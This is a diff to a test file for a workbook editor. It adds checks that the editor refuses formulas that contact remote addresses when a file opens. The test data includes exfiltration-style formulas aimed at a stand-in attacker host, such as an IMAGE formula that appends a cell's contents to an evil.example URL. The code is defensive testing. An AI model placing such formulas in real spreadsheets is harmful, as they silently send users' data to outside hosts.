@@ -211,6 +211,16 @@ section('what the review found');
     refused = err.message;
   }
   check('a formula that reaches out is not added', /reaches out/.test(refused), refused);
+  // IMAGE and the IMPORT family fetch an address the moment the file opens (2026-11-11, "CellShock").
+  for (const formula of ['=IMAGE("https://evil.example/?d="&A1)', '=IMPORTXML("https://evil.example","//a")']) {
+    let said = '';
+    try {
+      editWorkbook(workbook(), [{ sheet: 1, cell: 'K5', formula }]);
+    } catch (err) {
+      said = err.message;
+    }
+    check(`  nor ${formula.slice(1, formula.indexOf('('))}`, /reaches out/.test(said), said);
+  }
 
   const bomb = writeZip([
     ...[...partsOf(workbook())].map(([name, data]) => ({ name, data })),
